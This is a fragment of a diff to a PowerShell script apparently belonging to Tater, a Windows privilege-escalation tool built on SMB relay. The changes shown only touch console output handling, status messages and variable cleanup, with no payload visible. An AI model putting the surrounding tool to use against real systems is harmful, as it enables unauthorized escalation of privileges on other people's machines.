 # HTTP Server Start
@@ -1504,12 +1542,11 @@ TaterLoop
 
 if($tater.console_output)
 {
-
     :console_loop while($tater.running -and $tater.console_output)
     {
         while($tater.console_queue.Count -gt 0)
         {
-            write-output($tater.console_queue[0] + $tater.newline)
+            Write-Output($tater.console_queue[0] + $tater.newline)
             $tater.console_queue.RemoveRange(0,1)
         }
 
@@ -1524,25 +1561,11 @@ if($tater.console_output)
 
         Start-Sleep -m 5
     }
-}
 
-if(!$tater.running)
-{
-    if($tater.SMBRelay_success)
-    {  
-        if($trigger -eq 2)
-        {
-            Write-Output "$(Get-Date -format 's') - Remove scheduled task $Taskname manually when finished"
-        }
-
-        Write-Output "$(Get-Date -format 's') - Tater was successful and has exited"
-    }
-    else
+    if(!$tater.running)
     {
-        Write-Output "$(Get-Date -format 's') - Tater was not successful and has exited"
+        Remove-Variable tater -scope global
     }
-
-    Remove-Variable tater -scope global
 }
 
 }
